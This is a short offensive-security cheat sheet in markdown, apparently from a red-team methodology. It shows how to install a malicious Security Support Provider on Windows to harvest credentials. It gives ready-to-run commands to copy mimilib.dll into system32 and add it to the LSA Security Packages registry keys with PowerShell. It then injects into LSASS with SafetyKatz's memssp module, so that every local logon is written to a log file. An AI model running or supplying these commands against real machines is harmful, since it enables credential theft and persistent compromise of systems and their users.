# Methodology
>1. Drop `mimilib.dll` to system32.
>2. Add `mimilib` to registry.
>3. Inject into LSASS.

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz
**Copy `mimilib.dll` to system32:**
```cmd
copy mimilib.dll %systemroot%\system32
```

**Add `mimilib` to registry:**
```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' 
$packages += "mimilib" 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ - Name 'Security Packages' -Value $packages 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

**Inject into LSASS:**
```cmd
SafetyKatz.exe '"misc::memssp"'
```

>**ℹ️ Info:**
>To take effect the computer must reboot!
>
>All local logons will be saved to `C:\Windows\system32\mimilsa.log`.